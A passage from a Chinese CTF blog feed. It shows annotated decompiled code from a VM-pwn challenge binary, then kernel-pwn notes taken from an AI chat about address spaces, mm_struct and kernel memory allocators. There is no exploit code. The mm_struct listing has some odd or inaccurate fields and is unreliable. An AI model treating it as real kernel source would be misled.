class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  comment = <span class="built_in">malloc</span>(<span class="number">0x8Cu</span>LL);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  signal(<span class="number">2</span>, signal_handler);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;WELCOME TO OVM PWN\n&quot;</span>, <span class="number">0x16u</span>LL);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;PC: &quot;</span>, <span class="number">4uLL</span>);                       <span class="comment">// 输入pc寄存器值</span></span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;pc);                    <span class="comment">// %hd 主要用于 short int 类型的输入输出,16位</span></span><br><span class="line">  getchar();</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;SP: &quot;</span>, <span class="number">4uLL</span>);                       <span class="comment">// 输入sp寄存器值</span></span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;sp_);</span><br><span class="line">  getchar();</span><br><span class="line">  reg[<span class="number">13</span>] = sp_;                                <span class="comment">// 把sp和pc分别存到寄存器数组的13号和15号位置</span></span><br><span class="line">  reg[<span class="number">15</span>] = pc;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;CODE SIZE: &quot;</span>, <span class="number">0xBu</span>LL);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%hd&quot;</span>, &amp;v4);</span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">if</span> ( sp_ + (<span class="type">unsigned</span> <span class="type">int</span>)v4 &gt; <span class="number">0x10000</span> || !v4 )</span><br><span class="line">  &#123;                				  <span class="comment">// 检查sp+code_size不能超过0x10000（64K），且code_size不能为0，否则异常退出。</span></span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;EXCEPTION\n&quot;</span>, <span class="number">0xAu</span>LL);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">155</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;CODE: &quot;</span>, <span class="number">6uLL</span>);</span><br><span class="line">  running = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v4 &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;memory[pc + i]);       <span class="comment">//memory---&gt;opcode</span></span><br><span class="line">    <span class="keyword">if</span> ( (memory[i + pc] &amp; <span class="number">0xFF000000</span>) == <span class="number">0xFF000000</span> )</span><br><span class="line">      memory[i + pc] = <span class="number">0xE0000000</span>;              <span class="comment">// 如果指令高8位为0xFF（即0xFFxxxxxx），则强制改为0xE0000000</span></span><br><span class="line">    getchar();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( running )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = fetch();</span><br><span class="line">    execute(v7);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>, <span class="number">0x1Bu</span>LL);</span><br><span class="line">  read(<span class="number">0</span>, comment, <span class="number">0x8Cu</span>LL);</span><br><span class="line">  sendcomment(comment);                         <span class="comment">// free()</span></span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Bye\n&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="fetch"><a href="#fetch" class="headerlink" title="fetch()"></a>fetch()</h3><p>返回当前指令之后，跳转到下一条指令。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">fetch</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = reg[<span class="number">15</span>];</span><br><span class="line">  reg[<span class="number">15</span>] = v0 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)memory[v0];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用：</p>
<ul>
<li><p>取出当前PC（reg[15]）指向的指令（memory[v0]），然后PC自增1。</p>
</li>
<li><p>返回该指令。</p>
</li>
</ul>
<h3 id="execute-1"><a href="#execute-1" class="headerlink" title="execute()"></a>execute()</h3><p>执行函数的逆向才是VMPWN的核心。</p>
<p>我们先了解几个宏函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> LOWORD(l)           ((WORD)(((DWORD_PTR)(l)) &amp; 0xffff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIWORD(l)           ((WORD)((((DWORD_PTR)(l)) &gt;&gt; 16) &amp; 0xffff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LOBYTE(w)           ((BYTE)(((DWORD_PTR)(w)) &amp; 0xff))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIBYTE(w)           ((BYTE)((((DWORD_PTR)(w)) &gt;&gt; 8) &amp; 0xff))</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>vmpwn</tag>
      </tags>
  </entry>
  <entry>
    <title>内核pwn</title>
    <url>/2025/07/03/%E5%86%85%E6%A0%B8pwn%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/">参考链接-ctfwiki</a></p>
<p>下面是学习时收集的AI(gemini2.5pro)问答</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>您的 Ubuntu 22.04_amd64 VM</th>
<th>Linux Kernel arm64</th>
<th>QEMU 的角色</th>
</tr>
</thead>
<tbody><tr>
<td><strong>角色</strong></td>
<td><strong>开发平台 &#x2F; 工厂</strong></td>
<td><strong>目标产品</strong></td>
<td><strong>测试平台 &#x2F; 模拟器</strong></td>
</tr>
<tr>
<td><strong>架构</strong></td>
<td>amd64 &#x2F; x86-64</td>
<td>arm64 &#x2F; AArch64</td>
<td>自身是amd64程序，但能模拟arm64硬件</td>
</tr>
<tr>
<td><strong>关系</strong></td>
<td>在这里<strong>编译</strong>和<strong>准备</strong>arm64内核。</td>
<td>在这里<strong>被编译</strong>和<strong>被准备</strong>。</td>
<td>在amd64平台上为arm64内核提供<strong>运行环境</strong>。</td>
</tr>
</tbody></table>
<h2 id="关于64位128TB-用户空间-128TB-内核空间"><a href="#关于64位128TB-用户空间-128TB-内核空间" class="headerlink" title="关于64位128TB 用户空间 + 128TB 内核空间"></a><strong>关于64位128TB 用户空间 + 128TB 内核空间</strong></h2><p>您提到的数字非常具体，这涉及到 x86-64 架构的一个特定设计。</p>
<ul>
<li><strong>64位的潜力</strong>：一个 64 位的指针理论上可以寻址 2^64 字节，这大约是 16 EB (Exabytes)，一个天文数字。</li>
<li><strong>现实的限制 (Canonical Addresses)</strong>：目前的 x86-64 架构 CPU 并没有使用全部 64 位来寻址，而是通常只使用了<strong>低 48 位</strong>。这要求一个有效的地址，其第 47 位到第 63 位必须全部相同（要么全是 0，要么全是 1）。这种规范格式的地址被称为<strong>规范地址 (Canonical Address)</strong>。<ul>
<li>这 48 位地址空间提供了 2^48 &#x3D; <strong>256 TB</strong> 的虚拟地址空间。</li>
</ul>
</li>
<li><strong>内核与用户的划分</strong>：Linux 内核非常巧妙地利用了这个“规范地址”的特点，将这 256TB 的虚拟地址空间一分为二：<ul>
<li><strong>用户空间 (User Space)</strong>：地址范围从 0x00000000_00000000 到 0x00007FFF_FFFFFFFF。这些地址的最高有效位都是 0。这部分空间的大小正好是 <strong>128 TB</strong>。这部分是每个进程私有的。</li>
<li><strong>内核空间 (Kernel Space)</strong>：地址范围从 0xFFFF8000_00000000 到 0xFFFFFFFF_FFFFFFFF。这些地址的最高有效位都是 1。这部分的大小也是 <strong>128 TB</strong>。这部分空间被所有进程<strong>共享</strong>，但只有在内核态才能访问。</li>
</ul>
</li>
</ul>
<h2 id="关于32位的3GB-用户空间-1GB-内核空间。"><a href="#关于32位的3GB-用户空间-1GB-内核空间。" class="headerlink" title="关于32位的3GB 用户空间 + 1GB 内核空间。"></a><strong>关于32位的3GB 用户空间 + 1GB 内核空间。</strong></h2><p><strong>根本限制</strong>：32 位的寻址能力</p>
<ul>
<li>一个 32 位的指针，其所能表示的不同地址数量是 2^32。</li>
<li>2^32 字节 &#x3D; 4,294,967,296 字节 &#x3D; 4 GB。</li>
<li>这意味着，在 32 位架构上，<strong>任何一个进程的虚拟地址空间总大小被死死地限制在了 4GB</strong>。</li>
</ul>
<p>对于系统中的每一个进程，它的 4GB 虚拟地址空间都被划分成如下两部分：</p>
<ol>
<li><strong>用户空间 (User Space): 3GB</strong><ul>
<li><strong>地址范围</strong>: 0x00000000 到 0xBFFFFFFF。</li>
<li><strong>内容</strong>: 这里存放着进程私有的一切，包括：<ul>
<li>程序代码（.text段）</li>
<li>已初始化的数据（.data段）</li>
<li>未初始化的数据（.bss段）</li>
<li>堆（Heap），用于动态内存分配（如 malloc）</li>
<li>栈（Stack），用于函数调用和局部变量</li>
<li>内存映射的库（如 libc.so）和文件。</li>
</ul>
</li>
<li><strong>属性</strong>: 这部分空间是<strong>进程私有的</strong>。进程 A 的 3GB 空间和进程 B 的 3GB 空间通过页表映射到了不同的物理内存上，它们互相隔离。</li>
</ul>
</li>
<li><strong>内核空间 (Kernel Space): 1GB</strong><ul>
<li><strong>地址范围</strong>: 0xC0000000 到 0xFFFFFFFF。</li>
<li><strong>内容</strong>: 这里存放着操作系统的核心代码和数据。</li>
<li><strong>属性</strong>: 这部分空间是<strong>所有进程共享的</strong>。无论当前哪个进程在运行，它的虚拟地址空间的高 1GB 都映射到同一块物理内存，即内核所在的物理内存。进程在用户态时没有权限访问这部分地址，只有当通过系统调用进入内核态后，CPU 的权限级别提升，才能访问这部分内存。</li>
</ul>
</li>
</ol>
<h2 id="关于mm-struct"><a href="#关于mm-struct" class="headerlink" title="关于mm_struct"></a><strong>关于mm_struct</strong></h2><p><code>mm_struct</code> 结构体是 Linux 内核中描述一个进程虚拟地址空间的核心数据结构，可以说是进程内存管理的“总司令部”。它包含了管理进程内存所需的所有信息。</p>
<p>这个结构体非常庞大且复杂，其定义位于内核源码的 <code>include/linux/mm_types.h</code> 文件中。由于内核版本更迭，字段会略有增删，但其核心成员和设计思想是稳定的。</p>
<p>以下是 <code>mm_struct</code> 的一些关键和有代表性的字段，并按照功能进行分类和注释，帮助您更好地理解。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义于: include/linux/mm_types.h</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> &#123;</span></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 1. 虚拟内存区域 (VMA) 管理</span></span><br><span class="line"><span class="comment">     * 这是 mm_struct 最核心的部分，用于管理进程的所有内存区域</span></span><br><span class="line"><span class="comment">     * (如代码段、数据段、堆、栈、内存映射文件等)。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">mmap</span>;</span>        <span class="comment">/* VMA 链表的头指针，按地址排序 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">mm_rb</span>;</span>               <span class="comment">/* VMA 的红黑树根节点，用于快速查找 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">mmap_cache</span>;</span>  <span class="comment">/* 最近找到的 VMA 缓存，提高查找效率 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 2. 页表和地址转换</span></span><br><span class="line"><span class="comment">     * 指向该进程的页表，是 CPU (MMU) 进行地址翻译的依据。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">pgd_t</span> * pgd;                        <span class="comment">/* 指向页全局目录 (Page Global Directory) 的指针 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 3. 内存使用计数</span></span><br><span class="line"><span class="comment">     * 统计和控制进程使用了多少内存。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">atomic_long_t</span> <span class="string">&quot;rss_stat&quot;</span>;         <span class="comment">/* 包含四种类型的驻留集大小 (RSS) 统计：</span></span><br><span class="line"><span class="comment">                                           - MM_FILEPAGES: 文件映射的物理页数</span></span><br><span class="line"><span class="comment">                                           - MM_ANONPAGES: 匿名映射的物理页数</span></span><br><span class="line"><span class="comment">                                           - MM_SWAPENTS:  交换区中的页数</span></span><br><span class="line"><span class="comment">                                           - MM_SHMEMPAGES: 共享内存页数</span></span><br><span class="line"><span class="comment">                                         */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> total_vm;             <span class="comment">/* 进程总的虚拟内存大小（以页为单位） */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> locked_vm;            <span class="comment">/* 被 mlock() 锁定的页数，不能被换出 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pinned_vm;            <span class="comment">/* 被特殊驱动 &quot;pin&quot; 住的页数 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> data_vm;              <span class="comment">/* 数据段的大小 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> exec_vm;              <span class="comment">/* 可执行代码段的大小 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_vm;             <span class="comment">/* 栈的大小 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 4. 进程地址空间范围定义</span></span><br><span class="line"><span class="comment">     * 记录了进程各个关键部分的起始和结束地址。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_code, end_code;     <span class="comment">/* 代码段的起始和结束地址 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_data, end_data;     <span class="comment">/* 数据段的起始和结束地址 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_brk, brk;           <span class="comment">/* 堆的起始和当前结束地址 (program break) */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> start_stack;              <span class="comment">/* 栈的起始地址 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> arg_start, arg_end;       <span class="comment">/* 命令行参数的起始和结束地址 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> env_start, env_end;       <span class="comment">/* 环境变量的起始和结束地址 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 5. 锁和同步机制</span></span><br><span class="line"><span class="comment">     * 用于保护 mm_struct 自身以及其下的 VMA 链表/红黑树在多线程环境下不被破坏。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mmap_lock</span> <span class="title">mmap_lock</span>;</span>         <span class="comment">/* 一个读写信号量，用于保护 VMA 结构。</span></span><br><span class="line"><span class="comment">                                           读操作（如缺页中断）可以并发，</span></span><br><span class="line"><span class="comment">                                           写操作（如 mmap/munmap）则需要独占访问。</span></span><br><span class="line"><span class="comment">                                         */</span></span><br><span class="line">    <span class="type">spinlock_t</span> page_table_lock;         <span class="comment">/* 保护页表的自旋锁 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 6. 进程所有权和使用计数</span></span><br><span class="line"><span class="comment">     * 记录了谁拥有这个地址空间以及有多少个线程在使用它。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">owner</span>;</span>          <span class="comment">/* 指向拥有这个地址空间的进程（通常是主线程）*/</span></span><br><span class="line">    <span class="type">atomic_t</span> mm_users;                  <span class="comment">/* 使用这个地址空间的线程数（例如，一个进程的所有线程共享同一个 mm_struct）*/</span></span><br><span class="line">    <span class="type">atomic_t</span> mm_count;                  <span class="comment">/* mm_struct 结构体自身的引用计数。当为0时，可以被销毁。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 7. 内核线程和上下文</span></span><br><span class="line"><span class="comment">     * 用于区分一个 mm_struct 是属于普通用户进程还是内核线程。</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> core_state;                     <span class="comment">/* 用于 coredump 的状态信息 */</span></span><br><span class="line">    u32 anova_context;                  <span class="comment">/* 匿名虚拟地址(AVA)的上下文 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/****************************************************************</span></span><br><span class="line"><span class="comment">     * 8. 缺页中断（Page Fault）相关</span></span><br><span class="line"><span class="comment">     ****************************************************************/</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> faultstamp;           <span class="comment">/* 最近一次 major fault 的时间戳 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> token_priority;       <span class="comment">/* 缺页令牌的优先级 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> last_interval;        <span class="comment">/* 两次 major fault 之间的间隔 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... 以及其他许多用于特定功能（如 coredump, transparent huge pages, KSM 等）的字段 ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p><strong>总结：</strong></p>
<table>
<thead>
<tr>
<th>数据结构</th>
<th>在 mm_struct 中的字段</th>
<th>擅长操作</th>
<th>主要应用场景</th>
<th>时间复杂度</th>
</tr>
</thead>
<tbody><tr>
<td><strong>VMA 链表</strong></td>
<td>mmap</td>
<td><strong>顺序遍历 (Iteration)</strong></td>
<td>fork(), &#x2F;proc&#x2F;pid&#x2F;maps, 跨多个VMA的munmap</td>
<td>遍历: O(n)</td>
</tr>
<tr>
<td><strong>VMA 红黑树</strong></td>
<td>mm_rb</td>
<td><strong>快速查找 (Lookup)</strong></td>
<td><strong>缺页中断 (Page Fault)</strong>, mmap时检查地址冲突</td>
<td>查找&#x2F;插入&#x2F;删除: O(log n)</td>
</tr>
</tbody></table>
<p><code>mm_struct</code> 就像一个进程的内存蓝图，它通过以下几个核心组件来工作：</p>
<ol>
<li><strong>VMA 链表和红黑树 (<code>mmap</code>, <code>mm_rb</code>)</strong>：这是灵魂所在。它将进程的虚拟地址空间划分为一个个具有不同属性（如可读、可写、可执行）的 <code>vm_area_struct</code> 区域。当你调用 <code>mmap</code> 时，内核就是在这里为你创建一个新的 VMA。</li>
<li><strong>页全局目录 (<code>pgd</code>)</strong>：这是通往硬件翻译的桥梁。<code>pgd</code> 指向该进程页表的顶层结构，CPU 的 MMU 正是利用它来将虚拟地址翻译为物理地址。</li>
<li><strong>内存统计 (<code>total_vm</code>, <code>rss_stat</code>)</strong>：提供了对进程内存使用情况的宏观掌控，也是 <code>top</code>、<code>free</code> 等命令的数据来源之一。</li>
<li><strong>锁 (<code>mmap_lock</code>)</strong>：保证了在多线程环境下，对内存布局的修改是安全的。</li>
</ol>
<p>每个用户进程都有其自己唯一的 <code>mm_struct</code>。而内核线程则比较特殊，它们没有自己的地址空间，所以它们的 <code>task_struct-&gt;mm</code> 字段通常是 <code>NULL</code>，它们运行时会借用上一个用户进程的 <code>mm_struct</code>。</p>
<h2 id="关于中断"><a href="#关于中断" class="headerlink" title="关于中断"></a>关于中断</h2><p>Linux内核通过中断技术，响应硬件发出的异步信号，暂停当前任务以立即处理紧急事件，从而实现高效的I&#x2F;O操作和任务调度。</p>
<h2 id="关于vmlloc、kmalloc、mmap"><a href="#关于vmlloc、kmalloc、mmap" class="headerlink" title="关于vmlloc、kmalloc、mmap"></a>关于vmlloc、kmalloc、mmap</h2><p><code>kmalloc</code>、<code>vmalloc</code> 和 <code>mmap</code> 是 Linux 内核和驱动开发中至关重要的三个内存操作机制。它们在不同的场景下使用，理解其区别是编写健壮、高效内核代码的基础。</p>
<h3 id="kmalloc-kfree：内核的主力内存分配方式"><a href="#kmalloc-kfree：内核的主力内存分配方式" class="headerlink" title="kmalloc &#x2F; kfree：内核的主力内存分配方式"></a><code>kmalloc</code> &#x2F; <code>kfree</code>：内核的主力内存分配方式</h3><p><code>kmalloc</code> 是内核中最常用、最高效的内存分配函数。</p>
<p> <code>void *kmalloc(size_t size, gfp_t flags);</code></p>
<ul>
<li><strong>作用</strong>: 分配一块<strong>物理上连续</strong>并且<strong>虚拟地址上也连续</strong>的内存。</li>
<li><strong>核心特点 (物理连续)</strong>: 这是 <code>kmalloc</code> 最重要的特征。因为它分配的内存在物理 RAM 中是连成一片的，所以非常适合需要进行 DMA (Direct Memory Access) 操作的硬件设备。DMA 控制器通常不理解虚拟地址，只能操作物理地址。</li>
<li><strong>分配来源</strong>: <code>kmalloc</code> 的内存来自于内核的 <strong>slab&#x2F;slub 分配器</strong>，这是一套为分配小块内存而高度优化的缓存机制。</li>
<li><strong>分配大小</strong>: 通常用于分配相对较小的、大小固定的内存块（一般不超过几兆字节，上限为 <code>KMALLOC_MAX_SIZE</code>）。</li>
<li><strong>速度</strong>: 非常快，因为大部分情况下是从预先分配好的缓存池中直接获取，几乎没有额外开销。</li>
<li><strong><code>gfp_t flags</code></strong>: 这是一个关键参数，用于指定分配行为。<ul>
<li><strong><code>GFP_KERNEL</code></strong>: 最常用的标志。表示可以在需要时睡眠（阻塞），等待内存变为可用。因此，它<strong>不能在中断上下文或持有自旋锁时使用</strong>。</li>
<li><strong><code>GFP_ATOMIC</code></strong>: 表示分配必须是原子的，绝不能睡眠。如果当前没有可用内存，它会立即返回 <code>NULL</code>。这是<strong>在中断处理程序等不能阻塞的代码中唯一可以使用的标志</strong>。</li>
</ul>
</li>
</ul>
<p> <code>void kfree(const void *objp);</code></p>
<ul>
<li><strong>作用</strong>: 释放由 <code>kmalloc</code> 分配的内存块，将其归还给 slab 分配器。</li>
<li><strong>规则</strong>: <code>kfree</code> 必须用于释放 <code>kmalloc</code> 分配的内存，不能混用。传入 <code>NULL</code> 是安全的操作。</li>
</ul>
<p><strong>一句话总结 <code>kmalloc</code></strong>: 用于为设备驱动和内核核心功能分配快速、物理连续的小块内存。</p>
<hr>
<h3 id="vmalloc-vfree：为大块虚拟内存而生"><a href="#vmalloc-vfree：为大块虚拟内存而生" class="headerlink" title="vmalloc &#x2F; vfree：为大块虚拟内存而生"></a><code>vmalloc</code> &#x2F; <code>vfree</code>：为大块虚拟内存而生</h3><p><code>vmalloc</code> 用于分配大块的、对物理连续性没有要求的内存。</p>
<p><code>void *vmalloc(unsigned long size);</code></p>
<ul>
<li><strong>作用</strong>: 分配一块<strong>虚拟地址上连续</strong>，但<strong>物理上不一定连续</strong>的内存。</li>
<li><strong>核心特点 (虚拟连续)</strong>: 内核会将来自不同物理位置的零散内存页（Pages），通过修改内核的页表，将它们映射成一块看起来连续的虚拟地址空间。</li>
<li><strong>分配来源</strong>: 直接从内核的伙伴系统（Buddy System）中请求物理页，然后构建页表来映射它们。</li>
<li><strong>分配大小</strong>: 非常适合需要大块内存（例如几十兆或更大）的场景，比如为某些模块加载大的固件，或者创建大的缓冲区。</li>
<li><strong>速度</strong>: 比 <code>kmalloc</code> 慢得多。因为它涉及到查找空闲物理页、修改页表等一系列更复杂的操作。</li>
<li><strong>是否可睡眠</strong>: <code>vmalloc</code> 可能会睡眠以等待内存，因此<strong>不能在中断上下文中使用</strong>。</li>
</ul>
<p><code>void vfree(const void *addr);</code></p>
<ul>
<li><strong>作用</strong>: 释放由 <code>vmalloc</code> 分配的内存。它会解除页表映射，并将底层的物理页归还给伙伴系统。</li>
<li><strong>规则</strong>: 与 <code>vfree</code> 配对使用，不能混用。</li>
</ul>
<p><strong>一句话总结 <code>vmalloc</code></strong>: 用于在内核中分配大块的、虚拟地址连续的内存，不关心物理上是否连续。</p>
<hr>
<h3 id="mmap-munmap：连接内核与用户的桥梁"><a href="#mmap-munmap：连接内核与用户的桥梁" class="headerlink" title="mmap &#x2F; munmap：连接内核与用户的桥梁"></a><code>mmap</code> &#x2F; <code>munmap</code>：连接内核与用户的桥梁</h3><p><code>mmap</code> 本身是一个<strong>系统调用</strong>，它不是一个像 <code>kmalloc</code> 那样直接供内核其他部分使用的分配函数。它的主要职责是在<strong>用户进程的虚拟地址空间</strong>中创建一块新的内存映射。</p>
<p>从内核的角度看，响应 <code>mmap</code> 系统调用的过程是：</p>
<ul>
<li><p><strong>作用</strong>: 在调用进程的地址空间中，创建一个新的 <strong>VMA (<code>vm_area_struct</code>)</strong>。这个 VMA 可以是：</p>
<ol>
<li><strong>文件映射 (File-backed)</strong>: 将一个文件的某一部分映射到进程的地址空间。当用户访问这块内存时，内核通过缺页中断机制，按需从磁盘读取文件内容到物理内存，并建立页表映射。对这块内存的修改也可以被写回文件。</li>
<li><strong>匿名映射 (Anonymous)</strong>: 创建一块不与任何文件关联的内存区域，通常用作程序的堆或栈。这块内存会被初始化为零。</li>
</ol>
</li>
<li><p><strong>核心特点</strong>: <code>mmap</code> 是实现用户空间与内核空间（特别是设备驱动）进行<strong>零拷贝 (Zero-copy)</strong> 数据交换的关键。驱动程序可以实现 <code>mmap</code> 接口，将设备的内存（如显存、硬件缓冲区）直接映射到用户空间，用户程序可以直接读写这块内存，避免了数据在内核和用户空间之间来回拷贝的开销。</p>
</li>
<li><p><strong>释放</strong>: 用户空间的程序通过调用 <code>munmap</code> 系统调用来解除这段映射，内核会回收对应的 VMA 和相关的物理内存页。</p>
</li>
</ul>
<p><strong>一句话总结 <code>mmap</code></strong>: 它是用户程序向内核申请创建内存映射的机制，是实现高效 I&#x2F;O 和进程内存管理的核心系统调用。</p>
<hr>
<h3 id="总结对比"><a href="#总结对比" class="headerlink" title="总结对比"></a>总结对比</h3><table>
<thead>
<tr>
<th align="left">特性</th>
<th align="left"><code>kmalloc</code></th>
<th align="left"><code>vmalloc</code></th>
<th align="left"><code>mmap</code> (从内核视角)</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>分配目标</strong></td>
<td align="left">内核自身使用</td>
<td align="left">内核自身使用</td>
<td align="left"><strong>用户进程</strong>的地址空间</td>
</tr>
<tr>
<td align="left"><strong>物理连续性</strong></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>否</strong></td>
<td align="left">取决于底层（通常是否）</td>
</tr>
<tr>
<td align="left"><strong>虚拟连续性</strong></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>是</strong></td>
<td align="left"><strong>是</strong></td>
</tr>
<tr>
<td align="left"><strong>常用大小</strong></td>
<td align="left">小块 (&lt; <code>KMALLOC_MAX_SIZE</code>)</td>
<td align="left">大块</td>
<td align="left">任意大小</td>
</tr>
<tr>
<td align="left"><strong>性能&#x2F;速度</strong></td>
<td align="left"><strong>非常快</strong></td>
<td align="left">较慢</td>
<td align="left">开销较大（涉及VMA操作）</td>
</tr>
<tr>
<td align="left"><strong>是否可睡眠</strong></td>
<td align="left">取决于<code>flags</code> (<code>GFP_ATOMIC</code>不可)</td>
<td align="left">是</td>
<td align="left">是（在系统调用上下文中）</td>
</tr>
<tr>
<td align="left"><strong>主要用途</strong></td>
<td align="left">DMA、描述符、小缓冲区</td>
<td align="left">大缓冲区、模块加载</td>
<td align="left"><strong>驱动与用户空间数据交换</strong>、文件映射</td>
</tr>
<tr>
<td align="left"><strong>释放函数</strong></td>
<td align="left"><code>kfree</code></td>
<td align="left"><code>vfree</code></td>
<td align="left"><code>munmap</code> (由用户进程调用)</td>
</tr>
</tbody></table>
<p>看过malloc.c源码的就知道，malloc()和free()其实就是对mmap和munmap的包装</p>
<h2 id="关于task-struct"><a href="#关于task-struct" class="headerlink" title="关于task_struct"></a>关于task_struct</h2><p><code>task_struct</code> 是 Linux 内核中<strong>最核心、最庞大</strong>的数据结构，没有之一。它就是内核对一个<strong>进程或线程</strong>的完整描述，通常被称为**“进程描述符”(Process Descriptor)**。</p>
<p>理解了 <code>task_struct</code>，就等于拿到了理解内核如何管理进程的钥匙。</p>
<p>这个结构体定义在内核源码的 <code>include/linux/sched.h</code> 文件中。由于它极其庞大（在现代内核中有数百个字段），我们不可能逐一讲解。最好的方式是将其<strong>按功能模块进行分类解读</strong>，这能让你看清它的设计脉络。</p>
<p><code>task_struct</code> 的核心作用：进程的“身份证”与“档案袋”</p>
<p>你可以把 <code>task_struct</code> 想象成一个人的全部档案，里面包含了：</p>
<ul>
